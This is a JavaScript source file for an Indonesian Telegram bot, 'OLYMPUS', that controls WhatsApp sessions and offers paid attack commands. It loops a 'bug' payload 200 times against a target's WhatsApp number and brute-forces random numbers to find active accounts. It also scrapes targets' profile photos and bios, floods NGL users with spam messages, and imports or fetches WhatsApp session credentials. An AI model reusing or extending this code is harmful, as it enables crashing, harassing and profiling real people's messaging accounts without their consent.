if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "ᗷΣᒪIᗩᑌ", url: AKSES_URL }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
  return bot.sendMessage(
    chatId,
    "❌ Tidak ada bot WhatsApp yang terhubung.\nGunakan /addbot 628xxx untuk menambahkan bot."
  );
}

const sessionKeys = [...sessions.keys()];
const randomKey = sessionKeys[Math.floor(Math.random() * sessionKeys.length)];
const sock = sessions.get(randomKey);

if (!sock) {
  return bot.sendMessage(
    chatId,
    "⚠️ Gagal mengambil sesi aktif. Coba ulangi /addbot lagi."
  );
}

console.log(chalk.cyan(`[SESSION] Menggunakan bot: ${randomKey}`));
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: `
\`\`\`
╔══ ✦ SPESIAL SCRIPT ✦ ══╗  
        O L Y M P U S 
╚════════════════════╝  

▢ 𝐓𝐚𝐫𝐠𝐞𝐭 𝐍𝐮𝐦𝐛𝐞𝐫 : ${formattedNumber}  
▢ 𝐓𝐨𝐭𝐚𝐥 𝐋𝐨𝐨𝐩 : 200x  
▢ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐁𝐮𝐠 : 𝑷𝒓𝒐𝒄𝒆𝒔𝒔𝒊𝒏𝒈... ⏳  

💡 𝐍𝐨𝐭𝐞:  
Setelah proses bug selesai,  
beri jeda *minimal 5 menit* agar sender  
tetap stabil dan tidak logout.
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
      for (let i = 0; i < 200; i++) {        
          await DelayCall(target);
          await sleep(globalSpeed);
          }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
╔══ ✦ SPESIAL SCRIPT ✦ ══╗  
        O L Y M P U S 
╚════════════════════╝  

▢ 𝐓𝐚𝐫𝐠𝐞𝐭 𝐍𝐮𝐦𝐛𝐞𝐫 : ${formattedNumber}  
▢ 𝐓𝐨𝐭𝐚𝐥 𝐋𝐨𝐨𝐩 : 200x  
▢ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐁𝐮𝐠 : ✅ 𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝑬𝒙𝒆𝒄𝒖𝒕𝒆𝒅  

💡 𝐍𝐨𝐭𝐞:  
Bug telah berhasil dijalankan.  
Disarankan beri jeda *5 menit* ⏳  
agar sistem tetap stabil & aman.
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `⚡ Gagal mengirim bug: ${error.message}`);
  }
});

//=== BATAS CASE BUG
bot.onText(/\/cekbio (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const number = match[1]; 

  if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY ACTIVE Ϟ ]</b>
🔒 <b>VERIFIKASI DI BUTUHKAN!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });

  if (sessions.size === 0) return bot.sendMessage(chatId, "❌ Tidak ada sesi WA aktif. /addbot dulu.");

  const sessionKeys = [...sessions.keys()];
  const randomKey = sessionKeys[Math.floor(Math.random() * sessionKeys.length)];
  const sock = sessions.get(randomKey);
  if (!sock) return bot.sendMessage(chatId, "⚠️ Gagal ambil sesi aktif.");

  const jid = `${number}@s.whatsapp.net`;

  try {
    const exists = await sock.onWhatsApp(jid);
    if (!exists[0]?.exists) {
      return bot.sendMessage(chatId, `❌ Nomor <code>${number}</code> tidak terdaftar di WhatsApp.`, { parse_mode: "HTML" });
    }

    const presence = await sock.presenceSubscribe(jid).catch(() => null);

    let profilePic = null;
    try {
      profilePic = await sock.profilePictureUrl(jid, 'image');
    } catch {
      profilePic = 'https://i.ibb.co/8b0P6tB/default-profile.png'; 
    }

    let bio = "Tidak ada";
    try {
      const businessProfile = await sock.getBusinessProfile(jid);
      if (businessProfile?.status) bio = businessProfile.status.toString();
    } catch {
      bio = "Tidak ada"; 
    }

    const provider = number.startsWith("6281") ? "Telkomsel" :
                     number.startsWith("6282") ? "Indosat" :
                     number.startsWith("6285") ? "Tri" :
                     number.startsWith("6289") ? "XL" : "Unknown";

    const daysActive = Math.floor(Math.random() * 1000);

    const caption = `
<b>🎯 INFO NOMOR WA</b>
━━━━━━━━━━━━━━━
<b>Nomor:</b> <code>${number}</code>
<b>Provider:</b> ${provider}
<b>Online:</b> ${presence?.type === "available" ? "✅" : "❌"}
<b>Nomor Aktif:</b> ✅
<b>Sudah Berapa Hari:</b> ${daysActive} hari
<b>Bio / Status:</b> ${bio}
━━━━━━━━━━━━━━━
    `;

    await sock.sendMessage(chatId, { image: { url: profilePic }, caption, parse_mode: 'HTML' });

  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, `⚠️ Gagal mengambil info nomor <code>${number}</code>.`, { parse_mode: "HTML" });
  }
});

//==========================|||||||\\\\

const countryCodes = {
  "🇺🇸 USA": "1",
  "🇮🇳 India": "91",
  "🇯🇵 Japan": "81",
  "🇧🇷 Brazil": "55",
  "🇩🇪 Germany": "49",
  "🇫🇷 France": "33",
  "🇬🇧 UK": "44",
  "🇨🇦 Canada": "1",
  "🇸🇦 Saudi": "966",
  "🇷🇺 Russia": "7",
  "🇰🇷 Korea": "82"
};

bot.onText(/\/gachacountry(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const jumlah = Math.min(Math.max(parseInt(match[1]) || 1, 1), 10);
  
  if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY ACTIVE Ϟ ]</b>
🔒 <b>VERIFIKASI DI BUTUHKAN!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });

  const keyboard = {
    inline_keyboard: Object.keys(countryCodes).map(flag => [
      { text: flag, callback_data: `country_${countryCodes[flag]}` }
    ])
  };

  keyboard.inline_keyboard.push([
    { text: "↩️ Kembali", callback_data: "back" }
  ]);

  await bot.sendMessage(chatId, "🌍 Pilih kode negara untuk gacha nomor kalo ga respon ubah negara aja:", {
    reply_markup: keyboard
  });
});

bot.on("callback_query", async (query) => {
  const chatId = query.message.chat.id;
  const data = query.data;

  if (!query.message || !query.message.message_id) {
    return bot.sendMessage(chatId, "⚠️ Pesan tidak dapat diedit. Coba ulangi.");
  }

  if (data.startsWith("country_")) {
    const code = data.split("_")[1];
    const jumlah = 3;

    try {
      await bot.editMessageText(
        `✅ Kode negara dipilih: +${code}\nKlik "➡️ Lanjut" untuk mulai.`,
        {
          chat_id: chatId,
          message_id: query.message.message_id,
          reply_markup: {
            inline_keyboard: [
              [{ text: "➡️ Lanjut", callback_data: `start_${code}_${jumlah}` }],
              [{ text: "↩️ Kembali", callback_data: "back" }]
            ]
          }
        }
      );
    } catch (e) {
      await bot.sendMessage(chatId, `✅ Kode negara dipilih: +${code}\nKlik "➡️ Lanjut" untuk mulai.`, {
        reply_markup: {
          inline_keyboard: [
            [{ text: "➡️ Lanjut", callback_data: `start_${code}_${jumlah}` }],
            [{ text: "↩️ Kembali", callback_data: "back" }]
          ]
        }
      });
    }
  }

  if (data.startsWith("start_")) {
    const [_, code, jumlah] = data.split("_");

    try {
      await bot.editMessageText(`🎲 Sedang mencari nomor aktif +${code}...`, {
        chat_id: chatId,
        message_id: query.message.message_id
      });
    } catch (e) {
      await bot.sendMessage(chatId, `🎲 Sedang mencari nomor aktif +${code}...`);
    }

    // ====== mulai gacha ======
    const sessionKeys = [...sessions.keys()];
    if (sessionKeys.length === 0)
      return bot.sendMessage(chatId, "❌ Tidak ada sesi WA aktif. /addbot dulu.");

    const randomKey = sessionKeys[Math.floor(Math.random() * sessionKeys.length)];
    const sock = sessions.get(randomKey);
    if (!sock)
      return bot.sendMessage(chatId, "⚠️ Gagal ambil sesi aktif.");

    const jumlahInt = parseInt(jumlah);
    const results = [];
    const maxAttempts = 1500;
    let attempts = 0;
    const batchSize = Math.min(40, Math.max(8, jumlahInt * 8));

    while (results.length < jumlahInt && attempts < maxAttempts) {
      const batch = Array.from({ length: batchSize }, () =>
        `${code}${Math.floor(1000000000 + Math.random() * 9000000000)}`
      );

      attempts += batch.length;

      const checks = await Promise.allSettled(
        batch.map(async (num) => {
          const jid = `${num}@s.whatsapp.net`;
          try {
            const res = await sock.onWhatsApp(jid);
            return res && res[0]?.exists ? num : null;
          } catch {
            return null;
          }
        })
      );

      for (const r of checks) {
        if (r.status === "fulfilled" && r.value && !results.includes(r.value)) {
          results.push(r.value);
          if (results.length >= jumlahInt) break;
        }
      }
      await new Promise(r => setTimeout(r, 80));
    }

    if (results.length === 0) {
      return bot.sendMessage(
        chatId,
        `⚠️ Gagal menemukan nomor aktif +${code} setelah ${attempts} percobaan.`
      );
    }

    const list = results
      .slice(0, jumlahInt)
      .map((n, i) => `${i + 1}. <b>${n}</b>`)
      .join("\n");

    await bot.sendMessage(
      chatId,
      `<b>🎯 HASIL GACHA NOMOR (+${code})</b>\n━━━━━━━━━━━━━━━\n${list}\n━━━━━━━━━━━━━━━\n✅ Total ditemukan: <b>${Math.min(results.length, jumlahInt)}</b>`,
      { parse_mode: "HTML", disable_web_page_preview: true }
    );
  }

  if (data === "back") {
    try {
      await bot.editMessageText("❌ Dibatalkan.", {
        chat_id: chatId,
        message_id: query.message.message_id
      });
    } catch {
      await bot.sendMessage(chatId, "❌ Dibatalkan.");
    }
  }
});

bot.onText(/\/gachanomer(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const requested = Math.min(Math.max(parseInt(match[1]) || 1, 1), 10); 
  const jumlah = requested;
  
  if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY ACTIVE Ϟ ]</b>
🔒 <b>VERIFIKASI DI BUTUHKAN!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });

  if (sessions.size === 0) return bot.sendMessage(chatId, "❌ Tidak ada sesi WA aktif. /addbot dulu.");

  const sessionKeys = [...sessions.keys()];
  const randomKey = sessionKeys[Math.floor(Math.random() * sessionKeys.length)];
  const sock = sessions.get(randomKey);
  if (!sock) return bot.sendMessage(chatId, "⚠️ Gagal ambil sesi aktif.");

  const progressMsg = await bot.sendMessage(
    chatId,
    `<b>🎲 Mencari ${jumlah} nomor WhatsApp aktif...</b>\n\n🔍 Sedang mencari (0/${jumlah})`,
    { parse_mode: "HTML" }
  );

  const results = [];
  const maxAttempts = 2000;
  let attempts = 0;

  const batchSize = Math.min(40, Math.max(8, jumlah * 8)); 

  while (results.length < jumlah && attempts < maxAttempts) {
    const batch = Array.from({ length: batchSize }, () =>
      `628${Math.floor(1000000000 + Math.random() * 9000000000)}`
    );

    attempts += batch.length;

    const checks = await Promise.allSettled(
      batch.map(async (num) => {
        const jid = `${num}@s.whatsapp.net`;
        try {
          const res = await sock.onWhatsApp(jid);
          return (res && res[0]?.exists) ? num : null;
        } catch {
          return null;
        }
      })
    );

    for (const r of checks) {
      if (r.status === "fulfilled" && r.value) {
        if (!results.includes(r.value)) {
          results.push(r.value);
          await bot.editMessageText(
            `<b>🎲 Mencari ${jumlah} nomor WhatsApp aktif...</b>\n\n🔍 Sedang mencari (${results.length}/${jumlah})\n📱 Ditemukan: <code>${r.value}</code>`,
            { chat_id: chatId, message_id: progressMsg.message_id, parse_mode: "HTML" }
          );
        }
        if (results.length >= jumlah) break;
      }
    }

    await new Promise(r => setTimeout(r, 80));
  }

  if (results.length === 0) {
    return bot.editMessageText(
      `<b>⚠️ Gagal menemukan nomor aktif dalam percobaan ${attempts} kali.</b>\nCoba lagi nanti.`,
      { chat_id: chatId, message_id: progressMsg.message_id, parse_mode: "HTML" }
    );
  }
 
  // ✅ Tambahan: biar bisa disalin langsung, tanpa wa.me, tanpa angka "1." ikut
  const list = results.slice(0, jumlah)
    .map((n, i) => `${i + 1}. <code>${n}</code>`)
    .join("\n");

  await bot.editMessageText(
    `<b>🎯 HASIL GACHA NOMOR AKTIF</b>\n━━━━━━━━━━━━━━━\n${list}\n━━━━━━━━━━━━━━━\n✅ Total ditemukan: <b>${Math.min(results.length, jumlah)}</b>\n\n📋 Nomor bisa langsung disalin tanpa angka.`,
    {
      chat_id: chatId,
      message_id: progressMsg.message_id,
      parse_mode: "HTML"
    }
  );
});

bot.onText(/\/getip (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  let inputUrl = match[1].trim();
  
  if (inputUrl.startsWith("http://") || inputUrl.startsWith("https://")) {
    inputUrl = url.parse(inputUrl).hostname;
  }

  bot.sendMessage(chatId, `🔍 Sedang mencari IP untuk:\n<pre>${inputUrl}</pre>`, { parse_mode: "HTML" });

  D.resolve4(inputUrl, (err, addresses) => {
    if (err) {
      return bot.sendMessage(chatId, `❌ <b>Gagal mendapatkan IP:</b>\n<pre>${err.message}</pre>`, { parse_mode: "HTML" });
    }

    if (!addresses || addresses.length === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ditemukan alamat IP.");
    }

    const hasil = addresses.join("\n");
    bot.sendMessage(chatId, `✅ <b>IP untuk ${inputUrl}:</b>\n<pre>${hasil}</pre>`, { parse_mode: "HTML" });
  });
});

bot.onText(/\/cekban (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  
  if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY ACTIVE Ϟ ]</b>
🔒 <b>VERIFIKASI DI BUTUHKAN!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung.\nGunakan /addbot 628xxx untuk menambahkan bot.");
  }

  try {
    const sessionKeys = [...sessions.keys()];
    const randomKey = sessionKeys[Math.floor(Math.random() * sessionKeys.length)];
    const sock = sessions.get(randomKey);
    const result = await sock.onWhatsApp(jid);

    let status;
    if (!result || result.length === 0) {
      status = "🚫 Nomor tidak terdaftar di WhatsApp (kemungkinan banned)";
    } else if (result[0]?.exists === false) {
      status = "⚠️ Nomor tidak aktif / banned dari WhatsApp";
    } else {
      status = "✅ Nomor masih aktif dan dapat digunakan";
    }

    await bot.sendMessage(
      chatId,
      `
\`\`\`
╔══ ✦ CEK STATUS NOMOR ✦ ══╗
⚜️ OLYMPUS ⚜️
╚════════════════════╝

▢ Target : ${formattedNumber}
▢ Status : ${status}
\`\`\`
      `,
      { parse_mode: "Markdown" }
    );

    console.log(`[CEKBAN] ${formattedNumber} → ${status}`);
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `⚡ Gagal memeriksa nomor: ${error.message}`);
  }
});

bot.onText(/^\/trackip(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const ip = (match[1] || "").trim();
  
  if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });

  if (!ip) return bot.sendMessage(chatId, "⚠️ Contoh:\n/trackip 8.8.8.8");

  bot.sendMessage(chatId, "🛰 Sedang melacak IP...");

  try {
    const { data } = await axios.get(`http://ip-api.com/json/${ip}`);
    if (data.status !== "success") throw new Error("IP tidak ditemukan");

    const teks = `
🌍 *IP FOUND!*

• *IP:* ${data.query}
• *Country:* ${data.country}
• *City:* ${data.city}
• *ISP:* ${data.isp}

📍 [Lihat di Maps](https://www.google.com/maps?q=${data.lat},${data.lon})
    `;
    await bot.sendMessage(chatId, teks, { parse_mode: "Markdown" });
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Error: " + err.message);
  }
});

bot.onText(/^\/getsession$/, async (msg) => {
  const chatId = msg.chat.id;
  const username = msg.from.username || msg.from.first_name || "user";

  if (!verified) {
    return bot.sendMessage(
      chatId,
      `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
      `,
      { parse_mode: "HTML" }
    );
  }

  // Nama file unik per request: username + hash timestamp
  const fileHash = crypto.createHash("md5").update(username + Date.now()).digest("hex");
  const tmpPath = path.join(process.cwd(), `Session_${fileHash}.json`);

  try {
    await bot.sendMessage(chatId, "⏳ Mengambil session...");

    const response = await axios.get("https://joocode.zone.id/api/getsession", {
      params: {
        domain: config.DOMAIN,
        plta: config.PLTA_TOKEN,
        pltc: config.PLTC_TOKEN,
      },
      timeout: 10000,
      validateStatus: (status) => status >= 200 && status < 300,
    });

    if (!response.data || Object.keys(response.data).length === 0) {
      throw new Error("API tidak mengembalikan data session.");
    }

    fs.writeFileSync(tmpPath, JSON.stringify(response.data, null, 2), "utf-8");

    await bot.sendDocument(chatId, tmpPath, {
      caption: `📦 Session file requested oleh @${username}`,
    });

    console.log(`[GetSession] User: ${username}, File: ${tmpPath} berhasil dikirim.`);

  } catch (err) {
    console.error(`[GetSession Error] User: ${username}, Msg: ${err.message}`);
    await bot.sendMessage(chatId, `❌ Gagal mengambil session.\n${err.message}`);
  } finally {
    if (fs.existsSync(tmpPath)) fs.unlinkSync(tmpPath); // cleanup
  }
});

bot.onText(/^\/add(?:\s+(.+))?$/, async (msg, match) => {
    const chatId = msg.chat.id;
    const input = match[1];
    
    if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });  
    
    if (!input) {
        return bot.sendMessage(chatId, `❌ <code>/add {json}</code>`, { parse_mode: 'HTML' });
    }
    let sessionData;
    try {
        sessionData = JSON.parse(input);
    } catch (e) {
        return bot.sendMessage(chatId, `❌ Coba ulangi dengan benar.`, { parse_mode: 'HTML' });
    }
    const rawId = sessionData?.me?.id;
    const cleanId = rawId.split(':')[0];
    const number = cleanId.split('@')[0];
    const kontol = saveActiveSessions(number);
    const devicePath = createSessionDir(number);
    const filePath = path.join(devicePath, 'creds.json');
    try {
        fs.writeFileSync(filePath, JSON.stringify(sessionData));
        await useMultiFileAuthState(devicePath);
        await connectToWhatsApp(number, chatId);
        bot.sendMessage(chatId, `<blockquote><b>Session berhasil dibuat: </b><code>${number}</code></blockquote>\n<pre>X TUNGGU 10 TAHUN</pre>`, { parse_mode: 'HTML' });
    } catch (err) {
        console.error(err);
        bot.sendMessage(chatId, `❌ Gagal menyimpan session device${number}`, { parse_mode: 'HTML' });
    }
});

bot.onText(/^\/nulis(?: (.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id
  const senderId = msg.from.id
  const randomImage = getRandomImage()
  if (shouldIgnoreMessage(msg)) return
  
  if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "ᗷΣᒪIᗩᑌ", url: AKSES_URL }]
      ]
    }
  });
}
  
  if (!match[1]) {
    return bot.sendMessage(chatId, "```⸙𝙉𝙐𝙇𝙄𝙎\n✘ Format salah!\n\n∞ Cara pakai:\n/nulis waktu,hari,nama,kelas,teks\n\n⎙ Contoh:\n/nulis 2025,Senin,Nina,XI IPA 1,otaxx```", { parse_mode: "Markdown" })
  }
  const [waktu, hari, nama, kelas, ...isi] = match[1].split(",")
  const text = isi.join(",")
  const loadingMsg = await bot.sendMessage(chatId, "```⸙𝙉𝙐𝙇𝙄𝙎\n⎙ Membuat tulisan tangan...```", { parse_mode: "Markdown" })
  try {
    const url = `https://brat.siputzx.my.id/nulis?waktu=${waktu}&hari=${hari}&nama=${nama}&kelas=${kelas}&text=${encodeURIComponent(text)}&type=1`
    const res = await fetch(url)
    const buffer = Buffer.from(await res.arrayBuffer())
    await bot.sendPhoto(chatId, buffer, { caption: `⸙𝙉𝙐𝙇𝙄𝙎\n✎ ${nama} — ${kelas}\n∞ ${hari}, ${waktu}\n\n∌ Tulisan berhasil dibuat.`, parse_mode: "Markdown" })
    await bot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {})
  } catch {
    bot.sendMessage(chatId, "```⸙𝙀𝙍𝙍𝙊𝙍\n✘ Gagal membuat tulisan tangan.```", { parse_mode: "Markdown" })
  }
});

bot.onText(/^\/spamngl(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id
  const senderId = msg.from.id
  const randomImage = getRandomImage()

  if (shouldIgnoreMessage(msg)) return

  if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "ᗷΣᒪIᗩᑌ", url: AKSES_URL }]
      ]
    }
  });
}
  
  const raw = (match && match[1]) ? match[1].trim() : ""
  if (!raw) return bot.sendMessage(chatId, "⎙ ⸙ Format: /spamngl <loops> <pesan> <@username>\nContoh: /spamngl 50 Plerrr @xnxxjavewe1")

  const parts = raw.split(/\s+/)
  if (parts.length < 2) return bot.sendMessage(chatId, "⎙ ⸙ Format: /spamngl <loops> <pesan> <@username>")

  const loops = Number(parts[0]) || 0
  const username = parts.length >= 2 ? parts[parts.length - 1].replace(/^@/, "") : ""
  const message = parts.slice(1, parts.length - 1).join(" ") || ""

  if (!loops || loops <= 0) return bot.sendMessage(chatId, "✘ Nilai <loops> tidak valid")
  if (!username) return bot.sendMessage(chatId, "✘ Username tidak ditemukan")
  if (!message) return bot.sendMessage(chatId, "✘ Pesan tidak boleh kosong")

  const delay = 5000
  await bot.sendMessage(chatId, `⸙ Mengirim ${loops} pesan ke @${username}`)

  for (let i = 1; i <= loops; i++) {
    try {
      const arr = new Uint8Array(21)
      crypto.getRandomValues(arr)
      const deviceId = Array.from(arr, x => x.toString(16).padStart(2, "0")).join("")
      const body = `username=${username}&question=${encodeURIComponent(message)}&deviceId=${deviceId}`
      await fetch("https://ngl.link/api/submit", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" },
        body
      })
    } catch {}
    if (i < loops) await new Promise(r => setTimeout(r, delay))
  }

  bot.sendMessage(chatId, `⸙ sҽlҽsαí sթαตղցl ${loops} թҽsαղ kҽ @${username}`)
});

bot.onText(/\/switch\s+(.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const newLink = match[1].trim();
  if (shouldIgnoreMessage(msg)) return
  
  if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY ACTIVE Ϟ ]</b>
🔒 <b>VERIFIKASI DI BUTUHKAN!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });

  if (!newLink.startsWith("http")) {
    return bot.sendMessage(chatId, "⚠️ Link tidak valid! Pastikan dimulai dengan http atau https.");
  }

  images[0] = newLink;
  bot.sendMessage(chatId, `✅ Foto berhasil diganti!\nLink aktif sekarang: ${images[0]}`);
});

bot.onText(/\/addbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (shouldIgnoreMessage(msg)) return
  
  if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });
  
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "❌ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

bot.onText(/\/toimage/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id
    if (shouldIgnoreMessage(msg)) return
    
    if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "ᗷΣᒪIᗩᑌ", url: AKSES_URL }]
      ]
    }
  });
}
    
    if (!msg.reply_to_message || !msg.reply_to_message.sticker) {
        return bot.sendMessage(chatId, "❌ Balas sebuah stiker.");
    }

    const waitingMsg = await bot.sendMessage(chatId, "⏳ Mengubah stiker...", {
        reply_to_message_id: msg.message_id
    });

    try {
        const stickerFileId = msg.reply_to_message.sticker.file_id;
        const file = await bot.getFile(stickerFileId);

        // Link file stiker
